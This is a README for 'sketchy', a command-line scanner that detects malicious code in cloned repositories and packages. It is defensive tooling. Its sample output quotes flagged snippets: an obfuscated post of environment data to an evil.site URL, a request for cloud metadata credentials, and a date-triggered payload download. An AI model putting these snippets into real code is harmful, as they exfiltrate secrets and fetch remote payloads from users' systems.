# 🔍 sketchy

**A comprehensive security scanner for folks who `git clone` first and ask questions later.**

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](http://makeapullrequest.com)
[![Go](https://img.shields.io/badge/Made%20with-Go-00ADD8.svg)](https://go.dev/)
[![GuardDog Inspired](https://img.shields.io/badge/Patterns%20from-GuardDog-purple.svg)](https://github.com/DataDog/guarddog)

> Because that random GitHub repo with 0 stars you're about to run probably isn't malicious... 

## Why sketchy?

You know how it goes. You find a repo that probably solves your problem. It has decent docs, a few stars, last commit 8 months ago. You're about to `npm install` or `pip install` or just straight up `./install.sh` it.

**Your brain:** *"This is probably fine."*  
**Also your brain:** *"But remember that time PyTorch got supply chain attacked?"*  
**You:** *"That won't happen to me."*  
**Narrator:** *"It could absolutely happen."*

`sketchy` is a fast, cross-platform security scanner that checks for the obvious (and not-so-obvious) signs that a package, repo, or script might be trying to ruin your day.

## What it catches

**Obvious Stuff**
- Cryptominers
- Reverse shells and backdoors
- Credential stealers targeting AWS, GitHub, SSH keys
- Suspicious network calls to sketchy domains (but smartly excludes localhost/127.0.0.1)

**Sneaky Stuff** (Thanks to GuardDog!)
- Unicode invisible characters that hide malicious code
- Typosquatting attempts (`reqeusts` instead of `requests`)
- Obfuscated JavaScript that's trying too hard
- Steganography (code hidden in images!)
- Silent process execution

**Supply Chain Special**
- npm lifecycle scripts doing sketchy things
- Python setup.py downloading "extra features"
- Base64 encoded payloads
- Dynamic imports and eval() chains
- Git hooks manipulation
- Shell profile persistence (.bashrc, .zshrc modifications)

**Advanced Persistence & Exfiltration**
- Browser cookie/credential theft
- Cloud CLI credential access (AWS, Azure, GCP, Kubernetes)
- Cloud metadata endpoint access (169.254.169.254)
- Cron job and systemd persistence
- macOS LaunchAgent/LaunchDaemon persistence
- Docker socket abuse (container escapes)
- SSH key theft
- History file harvesting

## Quick Start

### Install (30 seconds)

#### Pre-built binaries (recommended)
```bash
# macOS/Linux - download latest release
curl -L https://github.com/adversis/sketchy/releases/latest/download/sketchy-$(uname -s)-$(uname -m).tar.gz | tar xz
chmod +x sketchy
sudo mv sketchy /usr/local/bin/

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/adversis/sketchy/releases/latest/download/sketchy-windows-amd64.zip" -OutFile "sketchy.zip"
Expand-Archive -Path "sketchy.zip" -DestinationPath "."
```

#### Build from source
```bash
git clone https://github.com/adversis/sketchy
cd sketchy/go
go build -o ../sketchy .
```

#### Bash version (legacy, but still good!)
```bash
curl -sSL https://raw.githubusercontent.com/adversis/sketchy/main/bash/sketchy.sh -o sketchy
chmod +x sketchy
```

### Use it

```bash
# Before you clone
git clone https://github.com/some/repo && sketchy repo/

# Or check that thing you already downloaded
sketchy ~/Downloads/totally-legit-tool/

# Just check the high-risk stuff (when you're in a hurry)
sketchy -high-only ./suspicious-package

# Check medium and high risk issues
sketchy -medium-up ./node_modules

# Make it automatic (add to ~/.zshrc or ~/.bashrc)
alias gitclone='git clone "$@" && sketchy "$(basename "$1" .git)"'

# Living dangerously? At least scan after
npm install && sketchy node_modules/
```

## Output

```bash
$ sketchy ./not-suspicious-at-all/

🔍 Scanning: ./not-suspicious-at-all/
================================
HIGH RISK [GuardDog] Hidden credential exfiltration - sensitive-exfil
  File: utils/helper.py:42
  Preview: requests.post(base64.b64decode("aHR0cDovL2V2aWwuc2l0ZS9jb2xsZWN0"), env...

HIGH RISK Cloud metadata endpoint access - cloud-metadata
  File: src/main.js:137
  Preview: fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')

MEDIUM RISK Time-based trigger detected - time-trigger
  File: setup.py:89
  Preview: if datetime.now() > datetime(2024, 12, 25): download_payload()...

================================
⚠️  Scan complete. Found 3 potential issue(s).
```

Exit code = number of issues found (great for CI/CD!)

## Filtering

```bash
# See everything (default)
sketchy ./repo

# Only see HIGH RISK findings
sketchy -high-only ./repo

# See MEDIUM and HIGH RISK findings
sketchy -medium-up ./repo
```

## Cross-Platform

The Go version works everywhere:
- **Linux**: AMD64, ARM64, ARMv7
- **macOS**: Intel, Apple Silicon (M1/M2/M3)
- **Windows**: AMD64, ARM64
- **BSD**: FreeBSD, OpenBSD

## Performance

- **Fast**: Compiled Go binary, concurrent scanning
- **Smart**: Skips binary files, respects .gitignore patterns
- **Lightweight**: Single binary, no dependencies
- **Efficient**: ~3MB binary scans massive repos in seconds

## But I use GuardDog/Semgrep/etc

Cool! Use them too! `sketchy` is designed to be:
- **Faster** - Go binary runs in seconds, not minutes
- **Simpler** - No Python/Node/Docker required
- **Earlier** - Quick scan before deep analysis
- **CI friendly** - Returns exit codes, no config needed

## Contributing

Found something sketchy that we missed? PR's welcome!

The codebase is simple:
- `main.go` - Core scanner logic
- `patterns.go` - All detection patterns
- `bash/sketchy.sh` - Original bash implementation (still maintained!)

## Building

```bash
# Current platform
cd go && go build -o ../sketchy .

# All platforms
make cross-compile

# Run tests
make test
```

## Fine print

- **License**: MIT
- **Warranty**: None. This is free software that might help you not get hacked.
- **Attribution**: Detection patterns inspired by [DataDog's GuardDog](https://github.com/DataDog/guarddog) (Apache 2.0)
- **Limitations**: Can't detect everything. Won't replace common sense. Some false positives. Some false negatives. YMMV.

## FAQ

**Q: Should I trust this tool?**  
A: You shouldn't trust anything, really. But the source is readable - audit it in 10 minutes.

**Q: It found malware, now what?**  
A: Delete it. Report it. Thank sketchy. Star this repo.

**Q: I found malware and sketchy didn't catch it.**  
A: Please report it! We're always improving detection patterns.

**Q: Is this paranoid?**  
A: npm had 1,300+ malicious packages in 2021 alone. PyPI, RubyGems, and others have similar issues. Is it really paranoia if they're actually out to get you?